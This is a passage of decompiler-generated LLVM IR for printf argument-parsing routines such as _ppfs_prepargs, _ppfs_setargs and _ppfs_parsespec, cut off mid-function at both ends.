  uselistorder i32 %v0_804ad4a, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804ad47, { 0, 2, 1 }
  uselistorder i32 %v1_804ad44, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_804ad7f, { 1, 0 }
  uselistorder label %dec_label_pc_804ad53, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804ad84 = load i32, i32* @esi, align 4
  %v0_804ad85 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804ad91 = add i32 %arg1, 24
  %v2_804ad91 = inttoptr i32 %v1_804ad91 to i32*
  %v3_804ad91 = load i32, i32* %v2_804ad91, align 4
  %v2_804ad94 = add i32 %arg1, 76
  %v3_804ad94 = inttoptr i32 %v2_804ad94 to i32*
  store i32 %arg2, i32* %v3_804ad94, align 4
  %tmp8 = icmp slt i32 %v3_804ad91, 1
  br i1 %tmp8, label %dec_label_pc_804adc2, label %dec_label_pc_804ad9b

dec_label_pc_804ad9b:                             ; preds = %entry
  %v1_804ad9e = load i32, i32* @ebx, align 4
  %v2_804ad9e = add i32 %v1_804ad9e, 28
  %v3_804ad9e = inttoptr i32 %v2_804ad9e to i32*
  store i32 %v3_804ad91, i32* %v3_804ad9e, align 4
  %v0_804ada1 = load i32, i32* @ebx, align 4
  %v1_804ada1 = add i32 %v0_804ada1, 24
  %v2_804ada1 = inttoptr i32 %v1_804ada1 to i32*
  store i32 0, i32* %v2_804ada1, align 4
  %v0_804ada8 = load i32, i32* @ebx, align 4
  %v1_804ada8 = add i32 %v0_804ada8, 4
  %v2_804ada8 = inttoptr i32 %v1_804ada8 to i32*
  store i32 0, i32* %v2_804ada8, align 4
  %v0_804adaf = load i32, i32* @ebx, align 4
  %v1_804adaf = add i32 %v0_804adaf, 8
  %v2_804adaf = inttoptr i32 %v1_804adaf to i32*
  store i32 0, i32* %v2_804adaf, align 4
  %v0_804adb6 = load i32, i32* @ebx, align 4
  %v1_804adb7 = call i32 @_ppfs_setargs(i32 %v0_804adb6)
  %v1_804adbf = load i32, i32* @ebx, align 4
  %v2_804adbf = add i32 %v1_804adbf, 24
  %v3_804adbf = inttoptr i32 %v2_804adbf to i32*
  store i32 %v3_804ad91, i32* %v3_804adbf, align 4
  br label %dec_label_pc_804adc2

dec_label_pc_804adc2:                             ; preds = %entry, %dec_label_pc_804ad9b
  %v2_804adc2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804ad85, i32* @ebx, align 4
  store i32 %v0_804ad84, i32* @esi, align 4
  ret i32 %v2_804adc2

; uselistorder directives
  uselistorder i32 %v3_804ad91, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804adc2, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804adc9 = load i32, i32* @ebx, align 4
  store i32 %v0_804adc9, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804adce = add i32 %arg1, 24
  %v2_804adce = inttoptr i32 %v1_804adce to i32*
  %v3_804adce = load i32, i32* %v2_804adce, align 4
  %v4_804adce = icmp eq i32 %v3_804adce, 0
  %v1_804add2 = add i32 %arg1, 80
  store i32 %v1_804add2, i32* %ebx.global-to-local, align 4
  %v1_804add5 = icmp eq i1 %v4_804adce, false
  %v1_804ae8d = add i32 %arg1, 8
  %v2_804ae8d = inttoptr i32 %v1_804ae8d to i32*
  %v3_804ae8d = load i32, i32* %v2_804ae8d, align 4
  %v8_804ae8d = icmp eq i32 %v3_804ae8d, -2147483648
  %v1_804ae94 = icmp eq i1 %v8_804ae8d, false
  br i1 %v1_804add5, label %dec_label_pc_804ae8d, label %dec_label_pc_804addb

dec_label_pc_804addb:                             ; preds = %entry
  br i1 %v1_804ae94, label %dec_label_pc_804adf5, label %dec_label_pc_804ade4

dec_label_pc_804ade4:                             ; preds = %dec_label_pc_804addb
  %v1_804ade4 = add i32 %arg1, 76
  %v2_804ade4 = inttoptr i32 %v1_804ade4 to i32*
  %v3_804ade4 = load i32, i32* %v2_804ade4, align 4
  store i32 %v3_804ade4, i32* %eax.global-to-local, align 4
  %v1_804ade7 = add i32 %v3_804ade4, 4
  store i32 %v1_804ade7, i32* %edx.global-to-local, align 4
  store i32 %v1_804ade7, i32* %v2_804ade4, align 4
  %v0_804aded = load i32, i32* %eax.global-to-local, align 4
  %v1_804aded = inttoptr i32 %v0_804aded to i32*
  %v2_804aded = load i32, i32* %v1_804aded, align 4
  store i32 %v2_804aded, i32* %eax.global-to-local, align 4
  %v1_804adef = load i32, i32* @ecx, align 4
  %v2_804adef = add i32 %v1_804adef, 80
  %v3_804adef = inttoptr i32 %v2_804adef to i32*
  store i32 %v2_804aded, i32* %v3_804adef, align 4
  %v0_804adf2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804adf2 = load i32, i32* @ecx, align 4
  %v2_804adf2 = add i32 %v1_804adf2, 8
  %v3_804adf2 = inttoptr i32 %v2_804adf2 to i32*
  store i32 %v0_804adf2, i32* %v3_804adf2, align 4
  %v0_804adf5.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804adf5

dec_label_pc_804adf5:                             ; preds = %dec_label_pc_804addb, %dec_label_pc_804ade4
  %v1_804ae04 = phi i32 [ %arg1, %dec_label_pc_804addb ], [ %v0_804adf5.pre, %dec_label_pc_804ade4 ]
  %v1_804adf5 = add i32 %v1_804ae04, 4
  %v2_804adf5 = inttoptr i32 %v1_804adf5 to i32*
  %v3_804adf5 = load i32, i32* %v2_804adf5, align 4
  %v8_804adf5 = icmp eq i32 %v3_804adf5, -2147483648
  %v1_804adfc = icmp eq i1 %v8_804adf5, false
  br i1 %v1_804adfc, label %dec_label_pc_804ae0f, label %dec_label_pc_804adfe

dec_label_pc_804adfe:                             ; preds = %dec_label_pc_804adf5
  %v1_804adfe = add i32 %v1_804ae04, 76
  %v2_804adfe = inttoptr i32 %v1_804adfe to i32*
  %v3_804adfe = load i32, i32* %v2_804adfe, align 4
  store i32 %v3_804adfe, i32* %eax.global-to-local, align 4
  %v1_804ae01 = add i32 %v3_804adfe, 4
  store i32 %v1_804ae01, i32* %edx.global-to-local, align 4
  store i32 %v1_804ae01, i32* %v2_804adfe, align 4
  %v0_804ae07 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae07 = inttoptr i32 %v0_804ae07 to i32*
  %v2_804ae07 = load i32, i32* %v1_804ae07, align 4
  store i32 %v2_804ae07, i32* %eax.global-to-local, align 4
  %v1_804ae09 = load i32, i32* @ecx, align 4
  %v2_804ae09 = add i32 %v1_804ae09, 80
  %v3_804ae09 = inttoptr i32 %v2_804ae09 to i32*
  store i32 %v2_804ae07, i32* %v3_804ae09, align 4
  %v0_804ae0c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae0c = load i32, i32* @ecx, align 4
  %v2_804ae0c = add i32 %v1_804ae0c, 4
  %v3_804ae0c = inttoptr i32 %v2_804ae0c to i32*
  store i32 %v0_804ae0c, i32* %v3_804ae0c, align 4
  %v1_804ae8615.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ae0f

dec_label_pc_804ae0f:                             ; preds = %dec_label_pc_804adf5, %dec_label_pc_804adfe
  %v1_804ae8615 = phi i32 [ %v1_804ae04, %dec_label_pc_804adf5 ], [ %v1_804ae8615.pre, %dec_label_pc_804adfe ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804ae8616 = add i32 %v1_804ae8615, 28
  %v3_804ae8617 = inttoptr i32 %v2_804ae8616 to i32*
  %v4_804ae8618 = load i32, i32* %v3_804ae8617, align 4
  %v5_804ae8920 = icmp sgt i32 %v4_804ae8618, 0
  br i1 %v5_804ae8920, label %dec_label_pc_804ae13, label %dec_label_pc_804aebb.loopexit

dec_label_pc_804ae13:                             ; preds = %dec_label_pc_804ae0f, %dec_label_pc_804ae85
  %v1_804ae8622 = phi i32 [ %v1_804ae86, %dec_label_pc_804ae85 ], [ %v1_804ae8615, %dec_label_pc_804ae0f ]
  %v1_804ae1321 = phi i32 [ %v1_804ae85, %dec_label_pc_804ae85 ], [ 0, %dec_label_pc_804ae0f ]
  %v2_804ae13 = mul i32 %v1_804ae1321, 4
  %v3_804ae13 = add i32 %v2_804ae13, 40
  %v4_804ae13 = add i32 %v3_804ae13, %v1_804ae8622
  %v5_804ae13 = inttoptr i32 %v4_804ae13 to i32*
  %v6_804ae13 = load i32, i32* %v5_804ae13, align 4
  store i32 %v6_804ae13, i32* %eax.global-to-local, align 4
  %v1_804ae17 = add i32 %v6_804ae13, -8
  %v9_804ae17 = icmp eq i32 %v1_804ae17, 0
  br i1 %v9_804ae17, label %dec_label_pc_804ae85, label %dec_label_pc_804ae1c

dec_label_pc_804ae1c:                             ; preds = %dec_label_pc_804ae13
  %v10_804ae17 = icmp slt i32 %v1_804ae17, 0
  %v6_804ae17 = sub i32 7, %v6_804ae13
  %v7_804ae17 = and i32 %v6_804ae17, %v6_804ae13
  %v8_804ae17 = icmp slt i32 %v7_804ae17, 0
  %v1_804ae1c = add i32 %v1_804ae8622, 76
  %v2_804ae1c = inttoptr i32 %v1_804ae1c to i32*
  %v3_804ae1c = load i32, i32* %v2_804ae1c, align 4
  store i32 %v3_804ae1c, i32* %edx.global-to-local, align 4
  %v3_804ae1f = icmp eq i1 %v10_804ae17, %v8_804ae17
  br i1 %v3_804ae1f, label %dec_label_pc_804ae2f, label %dec_label_pc_804ae21

dec_label_pc_804ae21:                             ; preds = %dec_label_pc_804ae1c
  %tmp13 = icmp slt i32 %v6_804ae13, 3
  %v9_804ae28 = icmp eq i32 %v6_804ae13, 7
  %v1_804ae2b = icmp eq i1 %v9_804ae28, false
  %or.cond = or i1 %tmp13, %v1_804ae2b
  br i1 %or.cond, label %dec_label_pc_804ae78, label %dec_label_pc_804ae5a

dec_label_pc_804ae2f:                             ; preds = %dec_label_pc_804ae1c
  %tmp14 = icmp sgt i32 %v6_804ae13, 1024
  br i1 %tmp14, label %dec_label_pc_804ae38, label %dec_label_pc_804ae78

dec_label_pc_804ae38:                             ; preds = %dec_label_pc_804ae2f
  %v6_804ae38 = icmp eq i32 %v6_804ae13, 2048
  br i1 %v6_804ae38, label %dec_label_pc_804ae48, label %dec_label_pc_804ae3f

dec_label_pc_804ae3f:                             ; preds = %dec_label_pc_804ae38
  %v9_804ae3f = icmp eq i32 %v6_804ae13, 2055
  %v1_804ae44 = icmp eq i1 %v9_804ae3f, false
  br i1 %v1_804ae44, label %dec_label_pc_804ae78, label %dec_label_pc_804ae69

dec_label_pc_804ae48:                             ; preds = %dec_label_pc_804ae38
  %v1_804ae48 = add i32 %v3_804ae1c, 8
  store i32 %v1_804ae48, i32* %eax.global-to-local, align 4
  store i32 %v1_804ae48, i32* %v2_804ae1c, align 4
  %v0_804ae4e = load i32, i32* %edx.global-to-local, align 4
  %v1_804ae4e = inttoptr i32 %v0_804ae4e to i32*
  %v2_804ae4e = load i32, i32* %v1_804ae4e, align 4
  store i32 %v2_804ae4e, i32* %eax.global-to-local, align 4
  %v1_804ae50 = add i32 %v0_804ae4e, 4
  %v2_804ae50 = inttoptr i32 %v1_804ae50 to i32*
  %v3_804ae50 = load i32, i32* %v2_804ae50, align 4
  store i32 %v3_804ae50, i32* %edx.global-to-local, align 4
  %v1_804ae53 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ae53 = inttoptr i32 %v1_804ae53 to i32*
  store i32 %v2_804ae4e, i32* %v2_804ae53, align 4
  %v0_804ae55 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ae55 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ae55 = add i32 %v1_804ae55, 4
  %v3_804ae55 = inttoptr i32 %v2_804ae55 to i32*
  store i32 %v0_804ae55, i32* %v3_804ae55, align 4
  br label %dec_label_pc_804ae82

dec_label_pc_804ae5a:                             ; preds = %dec_label_pc_804ae21
  %v3_804ae5a = load i32, i32* %v2_804ae1c, align 4
  store i32 %v3_804ae5a, i32* %edx.global-to-local, align 4
  %v1_804ae5d = add i32 %v3_804ae5a, 8
  store i32 %v1_804ae5d, i32* %eax.global-to-local, align 4
  store i32 %v1_804ae5d, i32* %v2_804ae1c, align 4
  %v0_804ae63 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ae63 = inttoptr i32 %v0_804ae63 to double*
  %v2_804ae63 = load double, double* %v1_804ae63, align 4
  %v2_804ae65 = load i32, i32* %ebx.global-to-local, align 4
  %v4_804ae65 = inttoptr i32 %v2_804ae65 to double*
  store double %v2_804ae63, double* %v4_804ae65, align 4
  br label %dec_label_pc_804ae82

dec_label_pc_804ae69:                             ; preds = %dec_label_pc_804ae3f
  %v3_804ae69 = load i32, i32* %v2_804ae1c, align 4
  store i32 %v3_804ae69, i32* %edx.global-to-local, align 4
  %v1_804ae6c = add i32 %v3_804ae69, 12
  store i32 %v1_804ae6c, i32* %eax.global-to-local, align 4
  store i32 %v1_804ae6c, i32* %v2_804ae1c, align 4
  %v0_804ae72 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ae72 = inttoptr i32 %v0_804ae72 to x86_fp80*
  %v2_804ae72 = load x86_fp80, x86_fp80* %v1_804ae72, align 4
  %v2_804ae74 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804ae74 = inttoptr i32 %v2_804ae74 to x86_fp80*
  store x86_fp80 %v2_804ae72, x86_fp80* %v3_804ae74, align 4
  br label %dec_label_pc_804ae82

dec_label_pc_804ae78:                             ; preds = %dec_label_pc_804ae21, %dec_label_pc_804ae2f, %dec_label_pc_804ae3f
  %v1_804ae78 = add i32 %v3_804ae1c, 4
  store i32 %v1_804ae78, i32* %eax.global-to-local, align 4
  store i32 %v1_804ae78, i32* %v2_804ae1c, align 4
  %v0_804ae7e = load i32, i32* %edx.global-to-local, align 4
  %v1_804ae7e = inttoptr i32 %v0_804ae7e to i32*
  %v2_804ae7e = load i32, i32* %v1_804ae7e, align 4
  store i32 %v2_804ae7e, i32* %eax.global-to-local, align 4
  %v1_804ae80 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ae80 = inttoptr i32 %v1_804ae80 to i32*
  store i32 %v2_804ae7e, i32* %v2_804ae80, align 4
  br label %dec_label_pc_804ae82

dec_label_pc_804ae82:                             ; preds = %dec_label_pc_804ae69, %dec_label_pc_804ae5a, %dec_label_pc_804ae48, %dec_label_pc_804ae78
  %v0_804ae82 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ae82 = add i32 %v0_804ae82, 12
  store i32 %v1_804ae82, i32* %ebx.global-to-local, align 4
  %v0_804ae85.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804ae86.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ae85

dec_label_pc_804ae85:                             ; preds = %dec_label_pc_804ae13, %dec_label_pc_804ae82
  %v1_804ae86 = phi i32 [ %v1_804ae8622, %dec_label_pc_804ae13 ], [ %v1_804ae86.pre, %dec_label_pc_804ae82 ]
  %v0_804ae85 = phi i32 [ %v1_804ae1321, %dec_label_pc_804ae13 ], [ %v0_804ae85.pre, %dec_label_pc_804ae82 ]
  %v1_804ae85 = add i32 %v0_804ae85, 1
  store i32 %v1_804ae85, i32* %esi.global-to-local, align 4
  %v2_804ae86 = add i32 %v1_804ae86, 28
  %v3_804ae86 = inttoptr i32 %v2_804ae86 to i32*
  %v4_804ae86 = load i32, i32* %v3_804ae86, align 4
  %v5_804ae89 = icmp slt i32 %v1_804ae85, %v4_804ae86
  br i1 %v5_804ae89, label %dec_label_pc_804ae13, label %dec_label_pc_804ae86.dec_label_pc_804aebb.loopexit_crit_edge

dec_label_pc_804ae8d:                             ; preds = %entry
  br i1 %v1_804ae94, label %dec_label_pc_804aea4, label %dec_label_pc_804ae96

dec_label_pc_804ae96:                             ; preds = %dec_label_pc_804ae8d
  %v1_804ae96 = add i32 %arg1, 36
  %v2_804ae96 = inttoptr i32 %v1_804ae96 to i8*
  %v3_804ae96 = load i8, i8* %v2_804ae96, align 1
  %v2_804ae9a = zext i8 %v3_804ae96 to i32
  %v3_804ae9a = mul nuw nsw i32 %v2_804ae9a, 12
  store i32 %v3_804ae9a, i32* %eax.global-to-local, align 4
  %v2_804ae9d = add i32 %arg1, 68
  %v3_804ae9d = add i32 %v2_804ae9d, %v3_804ae9a
  %v4_804ae9d = inttoptr i32 %v3_804ae9d to i32*
  %v5_804ae9d = load i32, i32* %v4_804ae9d, align 4
  store i32 %v5_804ae9d, i32* %eax.global-to-local, align 4
  store i32 %v5_804ae9d, i32* %v2_804ae8d, align 4
  %v0_804aea4.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804aea4

dec_label_pc_804aea4:                             ; preds = %dec_label_pc_804ae8d, %dec_label_pc_804ae96
  %v1_804aeb8 = phi i32 [ %arg1, %dec_label_pc_804ae8d ], [ %v0_804aea4.pre, %dec_label_pc_804ae96 ]
  %v1_804aea4 = add i32 %v1_804aeb8, 4
  %v2_804aea4 = inttoptr i32 %v1_804aea4 to i32*
  %v3_804aea4 = load i32, i32* %v2_804aea4, align 4
  %v8_804aea4 = icmp eq i32 %v3_804aea4, -2147483648
  %v1_804aeab = icmp eq i1 %v8_804aea4, false
  br i1 %v1_804aeab, label %dec_label_pc_804aebb, label %dec_label_pc_804aead

dec_label_pc_804aead:                             ; preds = %dec_label_pc_804aea4
  %v1_804aead = add i32 %v1_804aeb8, 37
  %v2_804aead = inttoptr i32 %v1_804aead to i8*
  %v3_804aead = load i8, i8* %v2_804aead, align 1
  %v2_804aeb1 = zext i8 %v3_804aead to i32
  %v3_804aeb1 = mul nuw nsw i32 %v2_804aeb1, 12
  store i32 %v3_804aeb1, i32* %eax.global-to-local, align 4
  %v1_804aeb4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804aeb4 = add nsw i32 %v3_804aeb1, -12
  %v3_804aeb4 = add i32 %v2_804aeb4, %v1_804aeb4
  %v4_804aeb4 = inttoptr i32 %v3_804aeb4 to i32*
  %v5_804aeb4 = load i32, i32* %v4_804aeb4, align 4
  store i32 %v5_804aeb4, i32* %eax.global-to-local, align 4
  store i32 %v5_804aeb4, i32* %v2_804aea4, align 4
  %v0_804aebb.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804aebb

dec_label_pc_804ae86.dec_label_pc_804aebb.loopexit_crit_edge: ; preds = %dec_label_pc_804ae85
  br label %dec_label_pc_804aebb.loopexit

dec_label_pc_804aebb.loopexit:                    ; preds = %dec_label_pc_804ae86.dec_label_pc_804aebb.loopexit_crit_edge, %dec_label_pc_804ae0f
  %v1_804ae86.lcssa = phi i32 [ %v1_804ae86, %dec_label_pc_804ae86.dec_label_pc_804aebb.loopexit_crit_edge ], [ %v1_804ae8615, %dec_label_pc_804ae0f ]
  br label %dec_label_pc_804aebb

dec_label_pc_804aebb:                             ; preds = %dec_label_pc_804aebb.loopexit, %dec_label_pc_804aea4, %dec_label_pc_804aead
  %v10_804aec2 = phi i32 [ %v1_804ae86.lcssa, %dec_label_pc_804aebb.loopexit ], [ %v1_804aeb8, %dec_label_pc_804aea4 ], [ %v0_804aebb.pre, %dec_label_pc_804aead ]
  %v1_804aebb = add i32 %v10_804aec2, 8
  %v2_804aebb = inttoptr i32 %v1_804aebb to i32*
  %v3_804aebb = load i32, i32* %v2_804aebb, align 4
  store i32 %v3_804aebb, i32* %eax.global-to-local, align 4
  %v2_804aebe = icmp slt i32 %v3_804aebb, 0
  %v1_804aec0 = icmp eq i1 %v2_804aebe, false
  br i1 %v1_804aec0, label %dec_label_pc_804aed6, label %dec_label_pc_804aec2

dec_label_pc_804aec2:                             ; preds = %dec_label_pc_804aebb
  %v1_804aec2 = add i32 %v10_804aec2, 16
  %v2_804aec2 = inttoptr i32 %v1_804aec2 to i32*
  %v3_804aec2 = load i32, i32* %v2_804aec2, align 4
  %v4_804aec2 = or i32 %v3_804aec2, 8
  store i32 %v4_804aec2, i32* %v2_804aec2, align 4
  %v0_804aec6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aec6 = sub i32 0, %v0_804aec6
  store i32 %v1_804aec6, i32* %eax.global-to-local, align 4
  %v1_804aec8 = load i32, i32* @ecx, align 4
  %v2_804aec8 = add i32 %v1_804aec8, 8
  %v3_804aec8 = inttoptr i32 %v2_804aec8 to i32*
  store i32 %v1_804aec6, i32* %v3_804aec8, align 4
  %v0_804aecb = load i32, i32* @ecx, align 4
  %v1_804aecb = add i32 %v0_804aecb, 16
  %v2_804aecb = inttoptr i32 %v1_804aecb to i32*
  %v3_804aecb = load i32, i32* %v2_804aecb, align 4
  %v4_804aecb = and i32 %v3_804aecb, -2
  store i32 %v4_804aecb, i32* %v2_804aecb, align 4
  %v0_804aecf = load i32, i32* @ecx, align 4
  %v1_804aecf = add i32 %v0_804aecf, 20
  %v2_804aecf = inttoptr i32 %v1_804aecf to i32*
  store i32 32, i32* %v2_804aecf, align 4
  %v0_804aed8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804aed6

dec_label_pc_804aed6:                             ; preds = %dec_label_pc_804aebb, %dec_label_pc_804aec2
  %v0_804aed8 = phi i32 [ %v3_804aebb, %dec_label_pc_804aebb ], [ %v0_804aed8.pre, %dec_label_pc_804aec2 ]
  %v2_804aed6 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804aed6, i32* @ebx, align 4
  ret i32 %v0_804aed8

; uselistorder directives
  uselistorder i32 %v3_804aeb1, { 1, 0 }
  uselistorder i32 %v3_804ae9a, { 1, 0 }
  uselistorder i32 %v1_804ae85, { 2, 1, 0 }
  uselistorder i32 %v1_804ae86, { 1, 2, 0 }
  uselistorder i32 %v3_804ae1c, { 1, 0, 2 }
  uselistorder i32* %v2_804ae1c, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804ae17, { 1, 0 }
  uselistorder i32 %v6_804ae13, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804ae1321, { 1, 0 }
  uselistorder i32 %v1_804ae8615, { 2, 0, 1 }
  uselistorder i1 %v1_804ae94, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_804aed6, { 1, 0 }
  uselistorder label %dec_label_pc_804aebb, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804aea4, { 1, 0 }
  uselistorder label %dec_label_pc_804ae85, { 1, 0 }
  uselistorder label %dec_label_pc_804ae82, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ae78, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ae13, { 1, 0 }
  uselistorder label %dec_label_pc_804ae0f, { 1, 0 }
  uselistorder label %dec_label_pc_804adf5, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804aedc = load i32, i32* @eax, align 4
  br label %dec_label_pc_804aee3

dec_label_pc_804aee3:                             ; preds = %dec_label_pc_804aee3, %entry
  %v0_804aee3 = phi i32 [ ptrtoint (i8** @global_var_805186a.323 to i32), %entry ], [ %v1_804aee3, %dec_label_pc_804aee3 ]
  %v1_804aee3 = add i32 %v0_804aee3, -2
  %v1_804aee6 = inttoptr i32 %v1_804aee3 to i16*
  %v2_804aee6 = load i16, i16* %v1_804aee6, align 2
  %v3_804aee6 = sext i16 %v2_804aee6 to i32
  %v12_804aee9 = icmp ne i32 %v3_804aee6, %v0_804aedc
  %v6_804aef3 = icmp ugt i32 %v1_804aee3, ptrtoint (i32* @global_var_8051852.324 to i32)
  %or.cond = and i1 %v6_804aef3, %v12_804aee9
  br i1 %or.cond, label %dec_label_pc_804aee3, label %dec_label_pc_804aef5

dec_label_pc_804aef5:                             ; preds = %dec_label_pc_804aee3
  %.pre = add i32 %v0_804aee3, -134551636
  %v2_804aefb = sdiv i32 %.pre, 2
  store i32 %v2_804aefb, i32* @edx, align 4
  %v1_804aefd = add i32 %v2_804aefb, ptrtoint (i8** @global_var_805186a.323 to i32)
  %v2_804aefd = inttoptr i32 %v1_804aefd to i8*
  %v3_804aefd = load i8, i8* %v2_804aefd, align 1
  %v4_804aefd = zext i8 %v3_804aefd to i32
  ret i32 %v4_804aefd

; uselistorder directives
  uselistorder i32 %v2_804aefb, { 1, 0 }
  uselistorder i32 %v1_804aee3, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805186a.323 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804af06 = load i32, i32* @edi, align 4
  %v0_804af07 = load i32, i32* @esi, align 4
  %v0_804af08 = load i32, i32* @ebx, align 4
  store i32 %v0_804af08, i32* %stack_var_-16, align 4
  %v4_804af08 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804af34 = add i32 %tmp76, 24
  %v2_804af34 = inttoptr i32 %v1_804af34 to i32*
  %v3_804af34 = load i32, i32* %v2_804af34, align 4
  store i32 %v3_804af34, i32* %eax.global-to-local, align 4
  %v1_804af3b = add i32 %tmp76, 16
  %v2_804af3b = inttoptr i32 %v1_804af3b to i32*
  %v3_804af3b = load i32, i32* %v2_804af3b, align 4
  %v1_804af3e = and i32 %v3_804af3b, 128
  %v2_804af3e = icmp eq i32 %v1_804af3e, 0
  store i32 %v1_804af3e, i32* %edi.global-to-local, align 4
  %v1_804af44 = icmp eq i1 %v2_804af3e, false
  br i1 %v1_804af44, label %dec_label_pc_804af57, label %dec_label_pc_804af46

dec_label_pc_804af46:                             ; preds = %entry
  %v2_804af46 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804afa4.outer

dec_label_pc_804af51:                             ; preds = %dec_label_pc_804b0df
  %v1_804af51 = add i32 %v0_804b0df.pre.pre, 1
  store i32 %v1_804af51, i32* @esi, align 4
  br label %dec_label_pc_804b0ef

dec_label_pc_804af57:                             ; preds = %entry
  %v15_804af09 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804af59

dec_label_pc_804af59:                             ; preds = %dec_label_pc_804af81.dec_label_pc_804af59_crit_edge, %dec_label_pc_804af57
  %v2_804af6a = phi i32 [ %v2_804af6a.pre, %dec_label_pc_804af81.dec_label_pc_804af59_crit_edge ], [ %v15_804af09, %dec_label_pc_804af57 ]
  %v3_804af6a = phi i32 [ %v1_804af81, %dec_label_pc_804af81.dec_label_pc_804af59_crit_edge ], [ 0, %dec_label_pc_804af57 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804af5d = mul i32 %v3_804af6a, 4
  store i32 %v1_804af5d, i32* @ecx, align 4
  %v2_804af64 = load i32, i32* %arg1, align 4
  store i32 %v2_804af64, i32* @edx, align 4
  %v2_804af66 = add i32 %v1_804af5d, -4
  %v3_804af66 = add i32 %v2_804af66, %v2_804af64
  %v4_804af66 = inttoptr i32 %v3_804af66 to i32*
  %v5_804af66 = load i32, i32* %v4_804af66, align 4
  store i32 %v5_804af66, i32* %eax.global-to-local, align 4
  %v1_804af6a = trunc i32 %v5_804af66 to i8
  %v4_804af6a = add i32 %v2_804af6a, 36
  %v5_804af6a = add i32 %v4_804af6a, %v3_804af6a
  %v6_804af6a = inttoptr i32 %v5_804af6a to i8*
  store i8 %v1_804af6a, i8* %v6_804af6a, align 1
  %v0_804af6e = load i32, i32* %eax.global-to-local, align 4
  %v1_804af6e = urem i32 %v0_804af6e, 256
  %v2_804af6e = load i32, i32* @ebx, align 4
  %v3_804af6e = and i32 %v2_804af6e, -256
  %v4_804af6e = or i32 %v3_804af6e, %v1_804af6e
  store i32 %v4_804af6e, i32* @ebx, align 4
  %v1_804af70 = mul i32 %v0_804af6e, 16777216
  %v2_804af70 = sdiv i32 %v1_804af70, 16777216
  store i32 %v2_804af70, i32* %eax.global-to-local, align 4
  %v1_804af73 = load i32, i32* @edx, align 4
  %v2_804af73 = load i32, i32* @ecx, align 4
  %v3_804af73 = add i32 %v1_804af73, -4
  %v4_804af73 = add i32 %v3_804af73, %v2_804af73
  %v5_804af73 = inttoptr i32 %v4_804af73 to i32*
  %v6_804af73 = load i32, i32* %v5_804af73, align 4
